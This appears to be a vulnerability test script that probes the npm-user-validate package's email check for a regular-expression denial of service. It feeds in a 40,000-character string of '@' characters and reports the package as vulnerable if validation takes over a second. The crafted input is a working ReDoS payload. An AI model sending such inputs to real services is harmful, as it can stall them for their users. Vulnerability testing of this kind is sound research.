// test("ReDos in npm-user-validate", () => {
  const genstr = require("../utils").genstr;
  const measureTime = require("../utils").measureTime;
  const npmu = require("npm-user-validate");
  let attack_str = "@" + genstr(40000, "@") + "!";
  let t = measureTime(function () {
    npmu.email(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
if (time > 1) {
	console.log("this_is_vulnerable")
} else {
	console.log("this_is_OK")
}
// });
